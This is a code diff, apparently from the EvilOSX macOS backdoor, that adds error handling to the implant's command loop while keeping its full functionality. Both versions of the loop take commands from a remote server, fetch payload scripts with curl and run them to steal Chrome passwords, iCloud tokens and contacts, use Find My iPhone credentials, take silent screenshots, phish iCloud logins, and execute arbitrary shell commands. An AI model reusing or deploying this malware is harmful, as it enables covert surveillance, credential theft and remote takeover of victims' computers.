@@ -348,163 +348,183 @@ def start_server():
             continue
 
         while True:
-            command = receive_message(server_socket)
+            try:
+                command = receive_message(server_socket)
 
-            if not command:
-                print MESSAGE_ATTENTION + "Server disconnected."
-                break  # Start listening again (goes to previous while loop).
+                if not command:
+                    print MESSAGE_ATTENTION + "Server disconnected."
+                    break  # Start listening again (goes to previous while loop).
 
-            print MESSAGE_INFO + "Received command: " + command
+                print MESSAGE_INFO + "Received command: " + command
 
-            if command == "help":
-                send_response(server_socket, get_help())
-            elif command == "get_computer_name":
-                send_response(server_socket, get_computer_name())
-            elif command == "get_shell_info":
-                shell_info = execute_command("whoami") + "\n" + get_computer_name() + "\n" + execute_command("pwd")
+                if command == "help":
+                    send_response(server_socket, get_help())
+                elif command == "get_computer_name":
+                    send_response(server_socket, get_computer_name())
+                elif command == "get_shell_info":
+                    shell_info = execute_command("whoami") + "\n" + get_computer_name() + "\n" + execute_command("pwd")
 
-                send_response(server_socket, shell_info)
-            elif command == "get_info":
-                system_version = str(platform.mac_ver()[0])
-                battery = execute_command("pmset -g batt").split('\t')[1].split(";")
-                filevault = execute_command("fdesetup status")
+                    send_response(server_socket, shell_info)
+                elif command == "get_info":
+                    system_version = str(platform.mac_ver()[0])
+                    battery = execute_command("pmset -g batt").split('\t')[1].split(";")
+                    filevault = execute_command("fdesetup status")
 
-                response = MESSAGE_INFO + "System version: " + system_version + "\n"
-                response += MESSAGE_INFO + "Model: " + get_model() + "\n"
-                response += MESSAGE_INFO + "Battery: " + battery[0] + battery[1] + ".\n"
-                response += MESSAGE_INFO + "WiFi network: " + get_wifi() + " (" + get_external_ip() + ")\n"
-                response += MESSAGE_INFO + "Shell location: " + __file__ + "\n"
-                if is_root():
-                    response += MESSAGE_INFO + "We are root!\n"
-                else:
-                    response += MESSAGE_ATTENTION + "We are not root, see \"get_root\" for local privilege escalation.\n"
-                if "On" in filevault:
-                    response += MESSAGE_ATTENTION + "FileVault is on.\n"
-                else:
-                    response += MESSAGE_INFO + "FileVault is off."
-
-                send_response(server_socket, response)
-            elif command == "chrome_passwords":
-                payload_url = "https://raw.githubusercontent.com/Marten4n6/EvilOSX/master/Payloads/chrome_passwords.py"
-                payload_file = "/tmp/chrome_passwords.py"
-
-                execute_command("curl {0} -s -o {1}".format(payload_url, payload_file))
-                output = execute_command("python {0}".format(payload_file), False)
-
-                if "Error" in output:
-                    if "clicked deny" in output:
-                        send_response(server_socket, MESSAGE_ATTENTION + "Failed to get chrome passwords, user clicked deny.")
-                    elif "entry not found":
-                        send_response(server_socket, MESSAGE_ATTENTION + "Failed to get chrome passwords, Chrome not found.")
+                    response = MESSAGE_INFO + "System version: " + system_version + "\n"
+                    response += MESSAGE_INFO + "Model: " + get_model() + "\n"
+                    response += MESSAGE_INFO + "Battery: " + battery[0] + battery[1] + ".\n"
+                    response += MESSAGE_INFO + "WiFi network: " + get_wifi() + " (" + get_external_ip() + ")\n"
+                    response += MESSAGE_INFO + "Shell location: " + __file__ + "\n"
+                    if is_root():
+                        response += MESSAGE_INFO + "We are root!\n"
                     else:
-                        send_response(server_socket, MESSAGE_ATTENTION + "Failed to get chrome passwords, unknown error.")
-                else:
-                    send_response(server_socket, output)
+                        response += MESSAGE_ATTENTION + "We are not root, see \"get_root\" for local privilege escalation.\n"
+                    if "On" in filevault:
+                        response += MESSAGE_ATTENTION + "FileVault is on.\n"
+                    else:
+                        response += MESSAGE_INFO + "FileVault is off."
 
-                execute_command("rm -rf {0}".format(payload_file))
-            elif command == "decrypt_mme":
-                payload_url = "https://raw.githubusercontent.com/Marten4n6/EvilOSX/master/Payloads/MMeDecrypt.py"
-                payload_file = "/tmp/MMeDecrypt.py"
-
-                execute_command("curl {0} -s -o {1}".format(payload_url, payload_file))
-                output = execute_command("python {0}".format(payload_file), False)
-
-                if "Failed to get iCloud" in output:
-                    send_response(server_socket, MESSAGE_ATTENTION + "Failed to get iCloud Decryption Key (user clicked deny).")
-                elif "Failed to find" in output:
-                    send_response(server_socket, MESSAGE_ATTENTION + "Failed to find MMeToken file.")
-                else:
-                    # Decrypted successfully, store tokens in tokens.json
-                    with open(get_program_folder(is_root()) + "/tokens.json", "w") as open_file:
-                        open_file.write(output)
-
-                    send_response(server_socket, MESSAGE_INFO + "Decrypted successfully.")
-
-                execute_command("rm -rf {0}".format(payload_file))
-            elif command == "icloud_contacts":
-                if not os.path.isfile(get_program_folder(is_root()) + "/tokens.json"):
-                    # The server should handle this message and then call "decrypt_mme".
-                    send_response(server_socket, MESSAGE_ATTENTION + "Failed to find tokens.json")
-                else:
-                    payload_url = "https://raw.githubusercontent.com/Marten4n6/EvilOSX/master/Payloads/icloud_contacts.py"
-                    payload_file = "/tmp/icloud_contacts.py"
+                    send_response(server_socket, response)
+                elif command == "chrome_passwords":
+                    payload_url = "https://raw.githubusercontent.com/Marten4n6/EvilOSX/master/Payloads/chrome_passwords.py"
+                    payload_file = "/tmp/chrome_passwords.py"
 
                     execute_command("curl {0} -s -o {1}".format(payload_url, payload_file))
+                    output = execute_command("python {0}".format(payload_file), False)
 
-                    with open(get_program_folder(is_root()) + "/tokens.json") as open_file:
-                        response = ""
-
-                        for key, value in json.load(open_file).items():
-                            dsid = value["dsPrsID"]
-                            token = value["mmeAuthToken"]
-
-                            output = execute_command("python {0} {1} {2}".format(payload_file, dsid, token), False)
-
-                            response += MESSAGE_INFO + "Contacts for \"{0}\":\n".format(key)
-                            response += output
-
-                        send_response(server_socket, response)
+                    if "Error" in output:
+                        if "clicked deny" in output:
+                            send_response(server_socket,
+                                          MESSAGE_ATTENTION + "Failed to get chrome passwords, user clicked deny.")
+                        elif "entry not found":
+                            send_response(server_socket,
+                                          MESSAGE_ATTENTION + "Failed to get chrome passwords, Chrome not found.")
+                        else:
+                            send_response(server_socket,
+                                          MESSAGE_ATTENTION + "Failed to get chrome passwords, unknown error.")
+                    else:
+                        send_response(server_socket, output)
 
                     execute_command("rm -rf {0}".format(payload_file))
-            elif command.startswith("icloud_phish"):
-                email = command.replace("icloud_phish ", "")
-                output = icloud_phish(server_socket, email)
+                elif command == "decrypt_mme":
+                    payload_url = "https://raw.githubusercontent.com/Marten4n6/EvilOSX/master/Payloads/MMeDecrypt.py"
+                    payload_file = "/tmp/MMeDecrypt.py"
 
-                send_response(server_socket, output)
-            elif command == "itunes_backups":
-                send_response(server_socket, get_itunes_backups())
-            elif command.startswith("find_my_iphone"):
-                email = command.split(" ")[1]
-                password = command.split(" ")[2]
+                    execute_command("curl {0} -s -o {1}".format(payload_url, payload_file))
+                    output = execute_command("python {0}".format(payload_file), False)
 
-                payload_url = "https://raw.githubusercontent.com/Marten4n6/EvilOSX/7841226b942a1b3a5e12007210f4e49ae962c1aa/Payloads/find_my_iphone.py"
-                payload_file = "/tmp/find_my_iphone.py"
+                    if "Failed to get iCloud" in output:
+                        send_response(server_socket,
+                                      MESSAGE_ATTENTION + "Failed to get iCloud Decryption Key (user clicked deny).")
+                    elif "Failed to find" in output:
+                        send_response(server_socket, MESSAGE_ATTENTION + "Failed to find MMeToken file.")
+                    else:
+                        # Decrypted successfully, store tokens in tokens.json
+                        with open(get_program_folder(is_root()) + "/tokens.json", "w") as open_file:
+                            open_file.write(output)
 
-                execute_command("curl {0} -s -o {1}".format(payload_url, payload_file))
-                output = execute_command("python {0} {1} {2}".format(payload_file, email, password), False)
+                        send_response(server_socket, MESSAGE_INFO + "Decrypted successfully.")
 
-                send_response(server_socket, output)
-                execute_command("rm -rf {0}".format(payload_file))
-            elif command == "screenshot":
-                screenshot_file = "/tmp/screenshot.jpg"
+                    execute_command("rm -rf {0}".format(payload_file))
+                elif command == "icloud_contacts":
+                    if not os.path.isfile(get_program_folder(is_root()) + "/tokens.json"):
+                        # The server should handle this message and then call "decrypt_mme".
+                        send_response(server_socket, MESSAGE_ATTENTION + "Failed to find tokens.json")
+                    else:
+                        payload_url = "https://raw.githubusercontent.com/Marten4n6/EvilOSX/master/Payloads/icloud_contacts.py"
+                        payload_file = "/tmp/icloud_contacts.py"
 
-                execute_command("screencapture -x {0}".format(screenshot_file))
+                        execute_command("curl {0} -s -o {1}".format(payload_url, payload_file))
 
-                with open(screenshot_file, "rb") as open_file:
-                    send_response(server_socket, base64.b64encode(open_file.read()))
+                        with open(get_program_folder(is_root()) + "/tokens.json") as open_file:
+                            response = ""
 
-                execute_command("rm -rf {0}".format(screenshot_file))
-            elif command == "kill_client":
-                send_response(server_socket, "Farewell.")
-                kill_client(is_root())
-            elif command == "get_root":
-                get_root(server_socket)
-            else:
-                # Regular shell command
-                if len(command) > 3 and command[0:3] == "cd ":
-                    try:
-                        os.chdir(command[3:])
-                        send_response(server_socket, "EMPTY")
-                    except Exception:
-                        send_response(server_socket, "EMPTY")
-                        pass
-                else:
-                    process = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
-                    timer = Timer(5, lambda process: process.kill(), [process])
+                            for key, value in json.load(open_file).items():
+                                dsid = value["dsPrsID"]
+                                token = value["mmeAuthToken"]
 
-                    try:
-                        timer.start()  # Kill process after 5 seconds
-                        stdout, stderr = process.communicate()
-                        response = stdout + stderr
+                                output = execute_command("python {0} {1} {2}".format(payload_file, dsid, token), False)
 
-                        if not response:
-                            send_response(server_socket, "EMPTY")
-                        else:
+                                response += MESSAGE_INFO + "Contacts for \"{0}\":\n".format(key)
+                                response += output
+
                             send_response(server_socket, response)
-                    finally:
-                        timer.cancel()
 
-        server_socket.close()
+                        execute_command("rm -rf {0}".format(payload_file))
+                elif command.startswith("icloud_phish"):
+                    email = command.replace("icloud_phish ", "")
+                    output = icloud_phish(server_socket, email)
+
+                    send_response(server_socket, output)
+                elif command == "itunes_backups":
+                    send_response(server_socket, get_itunes_backups())
+                elif command.startswith("find_my_iphone"):
+                    email = command.split(" ")[1]
+                    password = command.split(" ")[2]
+
+                    payload_url = "https://raw.githubusercontent.com/Marten4n6/EvilOSX/7841226b942a1b3a5e12007210f4e49ae962c1aa/Payloads/find_my_iphone.py"
+                    payload_file = "/tmp/find_my_iphone.py"
+
+                    execute_command("curl {0} -s -o {1}".format(payload_url, payload_file))
+                    output = execute_command("python {0} {1} {2}".format(payload_file, email, password), False)
+
+                    send_response(server_socket, output)
+                    execute_command("rm -rf {0}".format(payload_file))
+                elif command == "screenshot":
+                    screenshot_file = "/tmp/screenshot.jpg"
+
+                    execute_command("screencapture -x {0}".format(screenshot_file))
+
+                    with open(screenshot_file, "rb") as open_file:
+                        send_response(server_socket, base64.b64encode(open_file.read()))
+
+                    execute_command("rm -rf {0}".format(screenshot_file))
+                elif command == "kill_client":
+                    send_response(server_socket, "Farewell.")
+                    kill_client(is_root())
+                elif command == "get_root":
+                    get_root(server_socket)
+                else:
+                    # Regular shell command
+                    if len(command) > 3 and command[0:3] == "cd ":
+                        try:
+                            os.chdir(command[3:])
+                            send_response(server_socket, "EMPTY")
+                        except Exception:
+                            send_response(server_socket, "EMPTY")
+                            pass
+                    else:
+                        try:
+                            process = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
+                            timer = Timer(5, lambda process: process.kill(), [process])
+
+                            try:
+                                timer.start()  # Kill process after 5 seconds
+                                stdout, stderr = process.communicate()
+                                response = stdout + stderr
+
+                                if not response:
+                                    send_response(server_socket, "EMPTY")
+                                else:
+                                    send_response(server_socket, response)
+                            finally:
+                                timer.cancel()
+                        except socket.error:
+                            print MESSAGE_ATTENTION + "Server disconnected, broken pipe."
+                            pass
+                        except Exception as ex:
+                            print MESSAGE_ATTENTION + ex.message
+                            send_response(server_socket, str(ex))
+            except socket.error as ex:
+                print MESSAGE_ATTENTION + "Server disconnected, connection reset ({0}).".format(ex.message)
+            except Exception as ex:
+                send_response(server_socket, MESSAGE_ATTENTION + ex.message)
+                continue
+
+        try:
+            server_socket.close()
+        except:
+            pass
 
 
 if os.path.dirname(os.path.realpath(__file__)).lower() != get_program_folder().lower() and not is_root():
